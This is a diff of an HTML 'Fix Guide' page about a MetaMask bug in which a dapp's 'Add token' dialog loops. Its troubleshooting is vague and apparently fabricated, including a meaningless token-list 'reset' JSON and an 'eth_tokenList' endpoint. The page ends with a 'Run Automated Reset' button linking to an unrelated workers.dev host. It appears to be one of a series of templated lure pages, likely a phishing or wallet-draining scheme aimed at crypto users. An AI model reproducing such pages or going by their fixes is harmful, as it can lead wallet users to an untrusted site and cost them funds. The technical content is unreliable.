@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A Dapp – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,40 +39,36 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Assets Confirming The Add Token From A Dapp</h1>
+<h1>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a persistent "Add token" page when attempting to confirm the addition of a token from a decentralized application (dapp) using the Metamask extension on the Ethereum (ETH) ecosystem.</li>
+<li>Users encounter a bug where the "Add token" dialog from a Dapp keeps popping up, preventing them from confirming the addition of assets to their Metamask wallet.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that prevents the confirmation dialog from completing the token addition process, resulting in an infinite loop.</li>
+<li>The error occurs due to a miscommunication between the Dapp and the Metamask extension, causing the "Add token" dialog to loop indefinitely.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Override the token addition process by manually adding the token contract address:</li>
-<li>Retrieve the token contract address from the dapp or blockchain explorer</li>
-<li>Use the following JSON configuration to add the token manually:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Clear the Metamask extension's cache and storage</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Use the following JSON configuration to reset the token list:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token_contract_address&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TOKEN_SYMBOL&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://...token_image_url&quot;</span>
+<span class="w">  </span><span class="nt">&quot;tokens&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">  </span><span class="nt">&quot;selectedToken&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<ul>
-<li>Update the Metamask token list using the <code>eth_tokenList</code> endpoint</li>
-</ul>
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Ethereum wallet set up and connected to the dapp</li>
-<li>Token contract address and details available for manual addition</li>
+<li>Metamask extension installed and enabled</li>
+<li>Ethereum-based Dapp with token addition functionality</li>
+<li>Latest version of the web browser being used</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It W</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
